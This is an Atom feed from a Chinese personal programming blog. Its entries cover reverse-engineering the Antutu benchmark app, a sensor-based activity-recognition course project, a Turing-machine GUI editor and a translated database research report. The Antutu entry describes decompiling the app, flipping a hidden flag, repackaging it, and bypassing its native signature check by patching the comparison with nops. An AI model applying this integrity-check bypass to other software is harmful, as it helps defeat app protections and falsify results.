<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Yqf's Blog]]></title>
  <subtitle><![CDATA[Day day up.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yqf3139.github.io/"/>
  <updated>2018-06-19T15:38:37.373Z</updated>
  <id>http://yqf3139.github.io/</id>
  
  <author>
    <name><![CDATA[yqf]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[如何获取到Antutu跑分的详细子项分数？]]></title>
    <link href="http://yqf3139.github.io/2018/06/19/how-to-peek-the-detailed-scores-in-Antutu/"/>
    <id>http://yqf3139.github.io/2018/06/19/how-to-peek-the-detailed-scores-in-Antutu/</id>
    <published>2018-06-19T12:46:48.000Z</published>
    <updated>2018-06-19T15:38:37.373Z</updated>
    <content type="html"><![CDATA[<p><a href="http://www.antutu.com/" target="_blank" rel="external">Antutu</a>是用户常用的一款智能设备跑分软件。如下图所示，它从四个大类来评估一台移动设备的性能，分别是CPU、GPU、UX和MEM。Antutu最终给出总分、一级汇总得分和二级得分，人们一般习惯使用总分来量化设备间的性能。</p>
<p><img alt="Antutu在手机上的跑分结果截图" src="/images/antutu/antutu-phone.jpg" width="30%" height="30%"></p>
<p>但近期我用Antutu的Android版本做性能测试时，发现UX大类中的<code>UX图形处理-鱼眼、Blur和JPG解码</code>一项分数明显比竞品低，便想查清楚原因。但此项中又包含三个子项，<strong>究竟每个子项的分数是多少呢？每个子项究竟是怎样进行评测的呢？</strong>一番网上搜寻后，我并没有找到Antutu官方出的分数计算报告白皮书，也没有在设备Log中或是其他地方找到详细分数的输出。那么似乎只能进入Antutu评测软件内部窥探一番了。</p>
<p>注意：破解Antutu并篡改分数等行为是被官方禁止的，本文只做Antutu分数的获取过程分享，测试用Antutu版本为V7.1.0。</p>
<h1 id="0x1_梳理Antutu跑分逻辑">0x1 梳理Antutu跑分逻辑</h1><p>首先解压Aututu主apk包，并同时使用<code>apktool</code>再将主apk解压反编译备用。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; apktool<span class="class">.bat</span> d <span class="string">"antutuv7.apk"</span></span><br></pre></td></tr></table></figure></p>
<p><img alt="Antutu Apk" src="/images/antutu/antutu-apk-structure.png" width="20%" height="20%"></p>
<p>接下来使用<code>dex2jar</code>工具将Aututu主apk包中的两个dex文件转换为jar包，并使用<code>JD-GUI</code>打开分析。</p>
<p>搜寻后发现非常显眼的是<code>jni</code>这个类。从中可以看到定义了Antutu每一个子测试的编号，能查询到我们想看到详细分数的三个子项分别是20、21和22号。并且还能看到<code>jni</code>类中关联着的Native函数，其实现都位于<code>lib\x86|armeabiv7\libabenchmark.so</code>中。</p>
<p>接下来不难发现，Antutu的跑分主流程在com.antutu.benchmark.service.BenchmarkService的f函数中，因为其中有大量的Native函数调用。</p>
<p><img alt="BenchmarkService" src="/images/antutu/benchmark-service.png" width="50%" height="50%"></p>
<p>Antutu 3D跑分为第一项进行，逻辑复杂，暂时跳过分析。后面的每一项测试的大体流程为，如果该跑分项目由Native层进行测试，比如多线程测试，则先由a(int)函数通知UI线程某项跑分开始了，然后通过dc.a(int)判断该跑分是否可以在Native层执行，并等待2秒后才开始真正测试。由于此处的Java类和方法有部分做了混淆，所以需要根据每个函数的具体实现猜测其功能。</p>
<p><img alt="Java invoke Native" src="/images/antutu/java-to-native.png" width="50%" height="50%"></p>
<p>通过IDA打开<code>libabenchmark.so</code>后，我们发现Native层并没有做更加完备的防护，搜索<code>benchmarkV6</code>函数，便可以找到更多测试函数的入口了。</p>
<p><img alt="benchmarkV6" src="/images/antutu/benchmarkV6.png" width="50%" height="50%"></p>
<p>如果该跑分项目在Java层进行，则先跑分，再通过<code>jni.benchmarkProcessUX</code>接口将分数导入Native层。比如测试XML(14)。</p>
<p><img alt="xml" src="/images/antutu/xml.png" width="50%" height="50%"></p>
<p>接下来我们继续研究UX图片处理的相应逻辑，我们寻找20~22编号的测试并详细查看其逻辑。</p>
<p><img alt="ux" src="/images/antutu/ux.png" width="50%" height="50%"></p>
<p>其中，JPG decode比较简单，使用Java的BitmapFactory.decodeByteArray测试。分数为5秒内decode的次数。由于是纯Java实现，我们可以将相应的代码自己实现后测试，但结果显示JPG decode并不是导致UX图像处理跑分低的根源。</p>
<p>而FishEye和Blur都使用了Native实现。搜索<code>fisheye</code>关键字，我们很快能看到其Native测试实现。</p>
<p><img alt="fisheye" src="/images/antutu/fisheye.png" width="50%" height="50%"></p>
<h1 id="0x2_获取Antutu_主应用的实际跑分值">0x2 获取Antutu 主应用的实际跑分值</h1><p>虽然我们已经看到了Antutu测试的部分实现的反编译结果，但除了直接分析，还有什么样的方法能更快地获取到Antutu的详细分数呢？</p>
<p>一种可能的办法是自己写一个Android App，并参照Antutu的JNI接口定义来定义类，比如说定义一个<code>com.antutu.aaa.bbb.jni</code>的类，并将<code>libabenchmark.so</code>去出打包到我们自己的App的Apk中并申明加载。加载后既可直接调用Native方法进行测试，或者是通过恢复Antutu存放分数的文件来直接读取已经存储的分数。这种方法应该是可行的，但比较麻烦。</p>
<p>经过不断的搜索，我们发现Antutu的详细跑分在一个内部flag开启的时候，会自动写到<code>/sdcard/.antutu/last_result.json</code>中。在跑分流程的末尾，可以发现这样一个<code>dc.a(context)</code>这样一个函数，它在<code>dc.b()</code>返回<code>true</code>时被触发，而<code>dc.b()</code>只是单纯地返回了<code>dc.f</code>这样一个静态变量，并且并没有找到在其他地方有被修改。</p>
<p><img alt="dc static" src="/images/antutu/dc-static.png" width="50%" height="50%"></p>
<p><img alt="dc a" src="/images/antutu/dc-a.png" width="50%" height="50%"></p>
<p>此时，一个简单的想法便是如果能将<code>dc.f</code>的默认值改为true，则可以获得这个分数了。</p>
<p><img alt="modify smali" src="/images/antutu/modify-smali.png" width="50%" height="50%"></p>
<p>重新使用<code>apktool b</code>指令重建Antutu的主Apk，并使用jarsign重新签名。但安装后发现Antutu卡死。</p>
<p>这是为何呢？寻找原因后发现Antutu在Native层做了自身的签名验证，验证不通过的话会不断sleep卡死App。</p>
<p><img alt="test sign" src="/images/antutu/test-sign.png" width="50%" height="50%"></p>
<p>详细观察代码后发现，result需要返回0才能通过判断，而绕过验证签名的方法为将<code>if(v21)</code>判断绕过即可。一个简单的办法就是将这里对应汇编的cmp操作全填<code>nop</code>即可。<br>最终可以获取到Antutu自动打印的详细分数了。</p>
<h1 id="0x3_获取Antutu_3D应用的实际跑分值">0x3 获取Antutu 3D应用的实际跑分值</h1><p>然而分析发现，主要是Fisheye得分较低。但分析Native代码无果，没有发现明显的优化点。将3D App屏蔽后，发现三者在Fisheye上分数都低了很多，并且十分接近，因此判断Fisheye分数是3D App中GPU加速的Fisheye测试与CPU Fisheye测试结合在一起得出的，而在GPU FishEye上得分低拖累了我们的分数。因此接下来我们需要继续探究Antutu 3D App。</p>
<p>Antutu 3D是使用Unity开发的，使用dnSpy看到可以看到其内部逻辑。<br>在OnTestPhysX找到了测试主逻辑。</p>
<p>测试方式为3秒中统计图像处理次数。</p>
<p><img alt="onTestPhysX" src="/images/antutu/onTestPhysX.png" width="50%" height="50%"></p>
<p>检查逻辑后还发现，Antutu对一些特性不支持时，暴力地降低分数，比如不支持computeShaders时，分数只有1/3，不支持ARGBFloat时，分数再减半。</p>
<p>为了获取到真实的分数，将debug的开关翻转，重新打包Antutu 3D APK，运行后可以在Logcat中看到分数的输出了。</p>
<p><img alt="3D" src="/images/antutu/3D.png" width="50%" height="50%"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://www.antutu.com/" target="_blank" rel="external">Antutu</a>是用户常用的一款智能设备跑分软件。如下图所示，它从四个大类来评估一台移动设备的性能，分别是CPU、GPU、UX和MEM。Ant]]>
    </summary>
    
      <category term="Android" scheme="http://yqf3139.github.io/tags/Android/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[通过多个传感器分类人体活动(课程作业)]]></title>
    <link href="http://yqf3139.github.io/2017/01/24/use-multiple-sensor-data-to-classify-human-activities/"/>
    <id>http://yqf3139.github.io/2017/01/24/use-multiple-sensor-data-to-classify-human-activities/</id>
    <published>2017-01-24T14:10:58.000Z</published>
    <updated>2017-01-24T15:12:40.214Z</updated>
    <content type="html"><![CDATA[<h1 id="课程作业要求">课程作业要求</h1><ul>
<li>《数据仓库与数据挖掘》机器学习分类方面的课程作业</li>
<li>本题目为针对时间序列数据进行活动分类</li>
<li>题目的数据集是通过在胸部的穿戴设备采集而来的三维时序数据<ul>
<li>1.csv ~ 15.csv 分别表示从 15 位接受数据采集的参与者身上采集而来的三维数据</li>
<li><code>desc.txt</code>数据集格式说明文件</li>
<li>数据特点:活动之间的连续性</li>
</ul>
</li>
<li>具体的任务<ul>
<li>单一活动类识别</li>
<li>活动转换点检测</li>
<li>多活动类别识别</li>
</ul>
</li>
</ul>
<h1 id="报告">报告</h1><p><em>报告最初是使用Google Docs写的，为了方便排版，就直接使用<a href="https://www.npmjs.com/package/hexo-pdf" target="_blank" rel="external">hexo-pdf</a>这个插件嵌入PDF了</em></p>


	<div class="row">
    <embed src="http://ok8l5e08o.bkt.clouddn.com/use-multiple-sensor-data-to-classify-human-activities-report.pdf" width="100%" height="550" type="application/pdf">
	</div>



<h1 id="项目代码">项目代码</h1><p><a href="https://github.com/yqf3139/Activity-Recognition-from-Single-Chest-Mounted-Accelerometer" target="_blank" rel="external">Github Repo</a>，细节详见Readme.md。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="课程作业要求">课程作业要求</h1><ul>
<li>《数据仓库与数据挖掘》机器学习分类方面的课程作业</li>
<li>本题目为针对时间序列数据进行活动分类</li>
<li>题目的数据集是通过在胸部的穿戴设备采集而来的三维时序数据<ul>
<li>1.csv]]>
    </summary>
    
      <category term="activity recognition" scheme="http://yqf3139.github.io/tags/activity-recognition/"/>
    
      <category term="machine learning" scheme="http://yqf3139.github.io/tags/machine-learning/"/>
    
      <category term="sensor" scheme="http://yqf3139.github.io/tags/sensor/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[朴素的图灵机编辑器和模拟器]]></title>
    <link href="http://yqf3139.github.io/2017/01/23/GUI-Turing-editor-and-runner-demo-how-native-Turing-Machine-calculate-the-N-th-fibonacci-number/"/>
    <id>http://yqf3139.github.io/2017/01/23/GUI-Turing-editor-and-runner-demo-how-native-Turing-Machine-calculate-the-N-th-fibonacci-number/</id>
    <published>2017-01-23T11:14:00.000Z</published>
    <updated>2017-01-23T14:48:20.901Z</updated>
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><h2 id="问题">问题</h2><p>题目：输出斐波拉契数列的图灵机。</p>
<p>要求：设计图灵机，输入n，然后输出斐波拉契数列的第n项。<br>(需要有图形界面和测试例子)</p>
<h2 id="功能">功能</h2><ul>
<li>图形化的通用图灵机编辑器。</li>
<li>半无限带图灵机模拟器，以及可视化调试环境。</li>
<li>使用上述环境实现题目要求的图灵机，并进行了局部性能优化。</li>
</ul>
<h2 id="开发说明">开发说明</h2><p>本次作业使用Web技术开发，其中vis图形库用于图灵机的设计与调试可视化，npm包管理，grunt用于工作流控制。<br>项目目录如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ tree . -L <span class="number">1</span></span><br><span class="line">.</span><br><span class="line">├── build                   <span class="comment">// Javascript文件中间结果存放</span></span><br><span class="line">│   └── bundle<span class="class">.js</span></span><br><span class="line">├── Gruntfile<span class="class">.js</span>            <span class="comment">// 定义Grunt自动化任务，如Browserify，Uglyfy</span></span><br><span class="line">├── node_modules            <span class="comment">// 使用npm install安装得到的依赖包</span></span><br><span class="line">├── package<span class="class">.json</span>            <span class="comment">// 描述项目依赖等信息</span></span><br><span class="line">├── public                  <span class="comment">// Web根目录</span></span><br><span class="line">│   ├── bundle<span class="class">.min</span><span class="class">.js</span>       <span class="comment">// 打包、代码混淆后的源文件</span></span><br><span class="line">│   ├── bundle<span class="class">.min</span><span class="class">.js</span><span class="class">.map</span>   <span class="comment">// 调试信息</span></span><br><span class="line">│   ├── <span class="tag">img</span></span><br><span class="line">│   ├── index<span class="class">.html</span>          <span class="comment">// Html布局文件</span></span><br><span class="line">│   └── vis<span class="class">.min</span><span class="class">.css</span>         <span class="comment">// vis图形库所需的层叠式样式表文件</span></span><br><span class="line">├── readme<span class="class">.md</span></span><br><span class="line">├── src                     <span class="comment">// 程序逻辑源文件夹</span></span><br><span class="line">│   ├── app<span class="class">.js</span>              <span class="comment">// 主程序</span></span><br><span class="line">│   ├── turing<span class="class">.js</span>           <span class="comment">// 图灵机编译与模拟器</span></span><br><span class="line">│   └── util<span class="class">.js</span>             <span class="comment">// 工具函数</span></span><br><span class="line">└── tmws                    <span class="comment">// 序列化的图灵机文件</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>依赖包安装：<code>npm install</code></li>
<li>编译、打包源文件：<code>grunt</code></li>
<li>启动服务器：<code>cd public &amp;&amp; python3 -m http.server</code></li>
</ul>
<h1 id="使用说明">使用说明</h1><ul>
<li>最简单的图灵机（读0写1,读1个1便接受）的设计、运行与调试，见视频Demo-1。</li>
<li>斐波拉契数列图灵机的读取、运行，见视频Demo-2，输入输出格式见图灵机设计描述。</li>
<li>在线Demo，<a href="http://security-administrator-alfred-48418.bitballoon.com/" target="_blank" rel="external">地址</a>。</li>
<li>代码，<a href="https://github.com/yqf3139/turing-gui" target="_blank" rel="external">Github Repo</a></li>
</ul>
<p><img src="http://ok8l5e08o.bkt.clouddn.com/demo1.gif" alt="Demo1"></p>
<p>Demo1</p>
<p><img src="http://ok8l5e08o.bkt.clouddn.com/demo2.gif" alt="Demo2"></p>
<p>Demo2</p>
<p>斐波拉契数列图灵机的文件见twms文件夹。</p>
<p>从视频Demo中可以轻松地看出图灵机的图形化设计、保存装载、编译重置、运行调试过程，<br>如下两张图展示了图灵机编译与运行过程中出现的错误提示。<br><img src="/images/turing-gui/1.jpg" alt="运行时错误提示"><br><img src="/images/turing-gui/2.jpg" alt="编译时错误提示"></p>
<h1 id="图灵机设计">图灵机设计</h1><h2 id="输入输出格式">输入输出格式</h2><p>工作区示意：<code>&lt;迭代次数计数器 C &gt;1&lt;当前计算的Fib数 M &gt;1&lt;上一次迭代计算的Fib数 N &gt;</code></p>
<p>输入格式： <code>0{n}101</code></p>
<p>输入样例：</p>
<ul>
<li>n=1: <code>0101</code></li>
<li>n=3: <code>000101</code></li>
<li>n=5: <code>00000101</code></li>
</ul>
<p>在上述样例中，从首位开始的连续的<code>0</code>的个数描述了n，后面紧跟的<code>1</code>是分割符号，<br>再后面一个<code>0</code>表示1，这是由于斐波那契数列的第一位数为1，再后面跟着一个<code>1</code>作为分割符。</p>
<p>输出格式： 读头指向连续0的个数为所求的第n位斐波那契数列的值，<code>0{fib(n)}10{fib(n-1)}</code>。</p>
<p>输出样例：</p>
<ul>
<li>n=1: <code>$1[读头&gt;]01</code></li>
<li>n=3: <code>$$$1[读头&gt;]0010</code></li>
<li>n=5: <code>$$$$$1[读头&gt;]000001000</code></li>
</ul>
<h2 id="计算思路">计算思路</h2><ul>
<li>单次迭代过程：将M复制一份到N后的空白区域，然后将M和N的分隔符移动到新复制的M的前一格。目的是计算将M+N赋予M，M赋予N。</li>
<li>迭代控制：若C不为0,则将C的计数器减1，然后执行上述迭代操作，并回到起始位置；否则移动读头到M的位置。</li>
<li>复制控制：逐个Bit将M复制到N后的空白区域。</li>
</ul>
<h2 id="转换图表示">转换图表示</h2><p><img src="/images/turing-gui/fib1.jpg" alt="第一个图灵机示意图"></p>
<h2 id="局部优化与效果">局部优化与效果</h2><p>观察上述图灵机，一个性能优化点在于在复制M的时候，新复制的M可以不全部写为$，再后期写为0，而可以改为将第一位标记为$，而后面的位都直接复制为0。这样后期就可以省去再将新N全部改写为0的操作了，而第一位标记为$是为了方便在新M和N之间放置分界符1。改动如下图所示：</p>
<p><img src="/images/turing-gui/fib2.jpg" alt="第二个图灵机示意图"></p>
<p>针对如上的性能优化点，收集两个图灵机的步数随N的变化数据，结果如下：<br><img src="/images/turing-gui/data.png" alt="优化效果"></p>
<p>可以看出，虽然第二个图灵机总是比第一个图灵机步数少，但性能的提升占总步数的比例却非常低，步数随着N呈指数级别上升，而优化的步数只呈现线性增长。</p>
<h1 id="工程实现">工程实现</h1><h2 id="使用Vis实现图绘制与操作">使用Vis实现图绘制与操作</h2><p><a href="http://visjs.org/index.html" target="_blank" rel="external">Vis.js</a>是一个基于浏览器的动态Javascript可视化库，其中封装好了高度可定制化、可视化的网络模块。为了实现图灵机的动态编辑，我基于Visjs开源的<a href="http://visjs.org/examples/network/other/manipulation.html" target="_blank" rel="external">示例程序</a>，加入了图灵机设计中需要的元素，以方便用户通过可视化的界面创建图灵机。</p>
<p>图灵机的绘制与操作逻辑主要位于<code>src/app.js</code>中，主要描述以下功能：</p>
<h3 id="创建图灵机设计绘图区">创建图灵机设计绘图区</h3><p>程序界面由<code>index.html</code>描述，主要分为两部分。网络编辑与可视化区域由id为<code>mynetwork</code>的网络绘图区，和id为<code>network-popUp</code>的网络信息编辑窗口构成。</p>
<p>控制面板由编译与调试信息，网络保存与载入控件，条带编辑区域和图灵机运行控制控件组成。在<code>document.body.onload</code>方法中可以看到对应控件的事件回调函数。</p>
<h3 id="定义图中点和边的对应操作">定义图中点和边的对应操作</h3><p><code>createNetwork</code>函数生成网络中初始的两个实例节点，并在<code>mynetwork</code>创建网络实例。其中的<code>options</code>参数描述了适用于图灵机的网络配置信息。<br><code>options.layout</code>定义了网络的点和边的布局，物理效果（点排斥，边吸引）可以更好地设计图灵机中的状态和转换。<br><code>options.manipulation</code>定义了网络中的六个基本事件的响应，点、边的增删改。对于点和边的增改，我们都给用户弹出信息编辑界面，并将数据保存在响应的点或是边中。对于新创建的点和边，赋予初始值。对于特殊的点和边，比如开始状态和结束状态，相应地修改点的特性以方便用户查看。</p>
<h3 id="保存与载入">保存与载入</h3><p>使用<code>saveWorkspace</code>函数将网络信息以JSON格式保存在文件中。<br>使用<code>restoreWorkspace</code>函数将用户选择的文件中的JSON信息重新解析为网络信息，并使用该网络信息创建网络，刷新界面。</p>
<h2 id="图灵机的编译">图灵机的编译</h2><p>图灵机的相关逻辑编写在<code>src/turing.js</code>模块中，对外暴露图灵机的主要数据结构以及图灵机的控制函数，同时需要提供信息输出接口，对网络中元素的高亮操作接口以及网络绘制回调。</p>
<p>图灵机数据结构中保存有如下信息：图灵机转换表，起始状态，读头位置，当前步数，当前状态，输入条带以及其他控制信息。</p>
<p>图灵机的编译函数为<code>turing.makeTable</code>。通过图的遍历，将图形化的图灵机翻译为图灵机状态转换表。状态转换表是一个二维映射表。第一层映射为状态到该状态的所有转换的映射；第二层映射为输入字符到某状态的其中一个转换的映射。</p>
<p>通过<code>reset</code>，完成图灵机运行前信息的初始化。</p>
<h2 id="图灵机的运行与调试">图灵机的运行与调试</h2><p>图灵机的运行函数为<code>start</code>，单步调试函数为<code>step</code>，其中运行函数不断调用单步函数，每一步的时间间隔可调。</p>
<p>单步函数每次以当前状态，当前读头下的字符作为输入，在图灵机转换边中，通过两层映射找到对应的转换，并按照转换中的下一个状态、下一个字符和读头移动方向更新图灵机状态信息，在信息更新后，调用高亮函数在图灵机的可视化界面上提示当前图灵机的运行状态，并调用绘图回调刷新用户界面；如果未找到，则停机并输出调试信息；如果图灵机下一步没有转换并且当前状态可以接受，那么图灵机成功停机并输出信息。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="简介">简介</h1><h2 id="问题">问题</h2><p>题目：输出斐波拉契数列的图灵机。</p>
<p>要求：设计图灵机，输入n，然后输出斐波拉契数列的第n项。<br>(需要有图形界面和测试例子)</p>
<h2 id="功能">功能</h2><ul>
]]>
    </summary>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="turing machine" scheme="http://yqf3139.github.io/tags/turing-machine/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[The Beckman Report on Database Research (翻译)]]></title>
    <link href="http://yqf3139.github.io/2016/09/19/trans-the-beckman-report-on-database-research/"/>
    <id>http://yqf3139.github.io/2016/09/19/trans-the-beckman-report-on-database-research/</id>
    <published>2016-09-19T03:15:04.000Z</published>
    <updated>2016-09-20T15:02:32.383Z</updated>
    <content type="html"><![CDATA[<p>数据库研究者将大数据描绘为一个决定性的挑战。我们需要集中精力在五个研究热点上才能最大程度地利用现在众多的机会。</p>
<p>数据库的一小队核心研究人员通过周期性的例会，交流探讨领域内的发展状态，并指出未来的核心发展方向。例会已经成功举办了多届，比如1989,1990,1995,1996,1998,2003,2008。28名数据库研究员和2位受邀的嘉宾于2013年10月在加州大小Irvine分校的Beckman中心举行了为期两天的讨论，延续了这一传统。<br>虽然参会人员被限定在了30人，这是为了最大程度地保证参会人员相互之间进行良好的互动，但他们分别代表了来自不同方向、资历和地区的研究兴趣。本文总结了本次会议的一些结论，更加详细的报告和与会人员的展示可以在<a href="http://beckman.cs.wisc.edu" target="_blank" rel="external">这里</a>找到。</p>
<h1 id="本文关键点">本文关键点</h1><ul>
<li>在2013年十月，来自数据库研究领域的三十位代表讨论了领域内的研究状态，并展望了未来的研究方向。</li>
<li>大数据被认为是领域内的一个决定性挑战。他们提出了五个相关的挑战：开发可伸缩的数据基础建构；应对在数据和数据管理中日益增加的多样性；提出端到端、数据到知识的处理管线；拥抱云计算的广泛普及和协调众多不断变化的人的角色。</li>
</ul>
<p>与会人员很快就大数据带来的决定性的挑战达成了一致。大数据问题的崛起是由于以下三个主要趋势。</p>
<ol>
<li>廉价的存储、传感器、智能设备、社交软件、多玩家游戏和让家、汽车、电器和其他设备互联的物联网让数据的产生的渠道越来越广；</li>
<li>多核处理器、固态硬盘、廉价的云计算资源和开源软件都让产生巨量的数据越来越容易；</li>
<li>数据管理正变得自治化。数据的产生、处理和消耗并不仅仅是数据库专家的专利了，数据管理已经成为了决策者、领域专家、用户、记者和工人的日常。</li>
</ol>
<p>随着这些数据浪潮的到来，从未出现过的巨大容量的数据需要被捕捉、存储、查询、处理并转变为知识。这些目标同十几年来被数据驱动的研究团体的目标非常吻合。很多早期的大数据系统抛弃了数据库管理系统的一些核心思想，例如声明式编程和事务数据一致性，从而换取伸缩性和在商用硬件上实现容错性。不过，在最新的大数据系统中，人们重新发现了这些核心的约束思想，并接受了一些在数据库领域长久以来的思想精髓。在这些核心约束和精髓上构建起来的数据库社区，有能力为大数据技术带来改革性质的改善。</p>
<p>不过大数据也带来了极大的挑战，提出的解决方案需要对数据管理解决方案的设计、实现和部署进行破坏性的革新。大数据的主要特点是容量、速度和多样性。数据库研究团体致力于推动容量和速度的研究多年，设计出的研究方案基础触及到所有的企业。而大数据浪潮带来的海量数据，让研究人员需要对已有的解决方案进行更加深入的探讨。</p>
<p>多样性来源于不同的数据源。</p>
<ul>
<li>首先，不同格式和质量的数据集成和分析成为了一个难题。这是数据库领域内一个长久存在的话题，不过从原始数据到可以使用的知识从目前来说还是需要耗费大量的人力。大数据加重了这个问题，这导致了数据处理管线中出现了一个主要的瓶颈；</li>
<li>第二，需要处理大数据的平台也有很多的变数：硬件基础设施、处理软件框架、编程语言、系统和编程抽象；</li>
<li>最后，用户也带来了复杂的需求和不同的偏好。想设计一个数据管理解决方案应对这么多的多样性是一个极大的挑战。</li>
</ul>
<p>除了三个V（容量、速度和多样性），<strong>众多的大数据应用选择在云计算平台上部署,这不论是公有还是私有云</strong>。这需要提供性能可预测、互操作灵活的新技术。很多的应用需要人来解决很多难以自动解决的语义理解问题。这包含了某个领域的专家或是很多工人，或是整个互联网（比如维基百科）。这就需要帮助人们便得更加高效的新技术，与此同时尽量降低解决这些问题需要的人力能力等级。</p>
<p>总而言之，大数据为研究人员带来了极大的挑战。我们必须重新思考教授数据管理的方法，重新审视我们的研究历程，适应这数据科学这个新研究分支的出现。</p>
<h1 id="研究的挑战">研究的挑战</h1><p>本次会议指出了五个大数据带来的挑战：</p>
<ul>
<li>可伸缩的数据基础设施，提供大容量高速的服务</li>
<li>应对大数据管理中的多样性</li>
<li>端到端数据处理</li>
<li>云服务</li>
<li>在数据生命周期中人的职责</li>
</ul>
<p>其中前三个挑战分别对应着大数据的容量、速度和多样性。后两个对应着云计算环境下大数据应用的部署和管理人在其中职责的变更。</p>
<p>在已有工作下，这些挑战并不是额外孤立的方向。近年来，数据库研究团体已经加强了关系数据管理系统的核心功能，并衍生出很多新的方向。会议中，诸多问题被提出：安全、隐私、数据属性、社交、移动、时空变化、私人、带有情景的、能耗敏感和科学数据管理的问题，其中很多与现有的大数据挑战有交叉，可以在相关领域深入讨论。</p>
<p>很多工作是与其他计算机科学领域合作完成的，比如分布式系统、人工智能、知识发现、数据挖掘、人机互动和电子科研。在许多案例中，这些专有的领域带来了新技术的灵感，并结合数据库研究人员的专业知识一起提出健壮的解决方案。这些高效地跨方向合作应该被大力提倡。</p>
<h1 id="可伸缩的大规模/快速数据基础设施">可伸缩的大规模/快速数据基础设施</h1><h2 id="并行和分布式数据处理">并行和分布式数据处理</h2><p>在数据库领域，大规模结构化数据的并行处理已经成功实现，这让众多基于SQL的产品在企业中大规模使用成为了可能。另一个成功应用在于数据仓库，数据库研究人员定义了数据立方（为了联机分析处理，OLAP）的关键概念和并行查询的策略，也更好地支持了实物化视图和数据复制。在大规模普通商用机器上，分布式领域已经用一些编程模型，例如MapReduce，在处理更大的非结构化数据方面取得了成功。在此基础上，更加高层的语言让更广阔的开发者群体可以使用大数据平台的扩展性。如今，像是Hadoop之类的开源平台已经在处理非结构化数据方向上获得了广泛的采纳，原因在于它MapReduce的编程模型、大规模的分布式存储系统和更高层的应用语言（Pig和Hive），这让传统的公司也开始使用这一技术。</p>
<h2 id="查询处理和优化">查询处理和优化</h2><p>声明式语言在大数据处理方向上广泛的普及，越来越多的人关注到代价敏感的查询优化器和面向集合的查询引擎的重要性。这将充分利用大规模多核机器集群的潜能，做到“纵向”与“横向”扩展。这就为处理过程监控带来了挑战，比如一个用户可以分析管理哪一个查询耗时过长或是占用了太多的计算资源。为了适应未曾分析过的数据格式，并减少数据分析阶段数据传输的代价，查询处理器需要将数据样本抽取、数据挖掘和机器学习整合在处理流程中。</p>
<h2 id="新兴的硬件">新兴的硬件</h2><p>对于一个数据中心的规模，随着更快的网络、服务器间完全二等分带宽的网络和远程内存直接访问技术的发展，顺序处理和网路传输的速度比率不断变化。除了通用多核处理器组成的集群，更多专用处理器也可纳入考虑范围。成功的商用数据库机器已经展示了软硬件协同设计的数据库管理系统的潜能。研究人员得考虑利用专用处理器，比如GPU、FPGA和应用专用集成电路来处理超大规模的数据集合。这些通信和处理技术革新将带来并行和分布式查询处理算法的重新考量，因为之前的算法是基于相同的硬件环境设计的。</p>
<h2 id="经济的存储">经济的存储</h2><p>数据库研究团体必须学会怎样利用最新的内存和存储技术。和传统的磁盘相比，固态硬盘虽然每GB价格较贵，但I/O操作延时小。多种非易失随机访问内存技术正在实验阶段，它们拥有不同的速度、能耗和耐久特性。</p>
<p>要考虑服务器扩展存储和网络扩展存储。例如HDFS的分布式的文件系统，虽然是服务器存储但却是网络共享的，这是两种方式的结合。怎样最好地利用一系列的存储？这像是重新回到了以前的共享内存或是共享磁盘或是不共享的旧的争论中，之前已经画上句号的争论随着硬件的升级可能需要重新被提起。</p>
<h2 id="高速数据流">高速数据流</h2><p>对于高速生成的数据流，我们需要新的可伸缩技术来应对数据流的处理和消化。比如说，应对不统一的内存访问和多层内存层级下的访问速度限制，这些数据流的信息密度低，所以需要在线实时处理后就丢弃掉不用的数据。更进一步，这些数据的样本和聚合统计信息需要被挑选出，并存储下来以应对稍后的查询和分析。对于这样的数据，渐进的查询处理提供了增量和部分查询结果，而在数据不断涌动处理的同时，逐渐地精确度提高，这种渐进式的处理十分重要。</p>
<h2 id="后绑定模式">后绑定模式</h2><p>对于被保持下来的数据，在其生命周期中可能只会发生一次被处理的机会（有可能从未被处理到），预先在数据库中对其进行处理和索引就非常不经济了。这样的数据应该被以二进制的方式保存下来，在被处理的时候再把它结构化解析。结果有可能是以自描述的方式存储的，键值对形式例如JSON，以预定义的模式进行解析或是使用数据挖掘进行演绎。为了提供在此情况下数据处理的最优方式，我们需要数据库可以以后绑定模式在原始文件上进行处理的查询引擎。</p>
<h2 id="一致性">一致性</h2><p>在今天，数据捕获、更新和简单快速地数据访问成为了新需求。对于非结构化数据来说，处理高速的数据捕获和更新需求导致了NoSQL系统的发展。目前有很多这类系统，提出了一系列的事务处理模型。大多是仅仅提供了基本的数据访问和弱原子操作保证。这让基于这些系统构建可信系统成为了难题。不过，大数据中一个新兴的团体通过键值存储提供了类数据库的成熟特性。对于一些用用来说，存储的数据对于一个公司来说就是“事实和真理”。对于其他应用来说，例如物联网，存储的数据反映着外界世界的情况，通过这些信息，应用可以做出相应的反映出。这就为重新考虑保证数据流通和一致性的编程模型和机制带来了机会，基于这些模型和技术，可以保证更加健壮的应用。</p>
